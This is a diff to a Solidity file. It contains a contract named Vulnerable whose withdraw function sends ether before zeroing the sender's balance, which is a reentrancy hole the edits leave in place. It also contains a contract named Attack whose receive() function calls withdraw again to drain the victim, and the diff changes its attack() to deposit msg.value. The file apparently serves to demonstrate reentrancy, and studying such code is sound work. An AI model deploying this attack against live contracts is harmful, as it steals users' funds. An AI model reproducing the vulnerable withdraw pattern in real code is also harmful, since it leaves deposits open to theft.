@@ -9,13 +9,17 @@ contract Vulnerable {
     }
 
     function withdraw() public {
-        uint bal = balances[msg.sender];
-        require(bal > 0);
+        uint amount = balances[msg.sender];
+        require(amount > 0);
 
-        (bool sent, ) = msg.sender.call{value: bal}("");
-        require(sent);
+        (bool success, ) = msg.sender.call{value: amount}("");
+        require(success);
 
         balances[msg.sender] = 0;
+    }
+
+    function getBalance() public view returns(uint) {
+        return address(this).balance;
     }
 }
 
@@ -27,13 +31,17 @@ contract Attack {
     }
 
     receive() external payable {
-        if (address(vulnerable).balance >= 1 ether) {
+        if(address(vulnerable).balance >= 1 ether) {
             vulnerable.withdraw();
         }
     }
 
     function attack() public payable {
-        vulnerable.deposit{value: 1 ether}();
+        vulnerable.deposit{value: msg.value}();
         vulnerable.withdraw();
+    }
+
+    function getBalance() public view returns(uint) {
+        return address(this).balance;
     }
 }
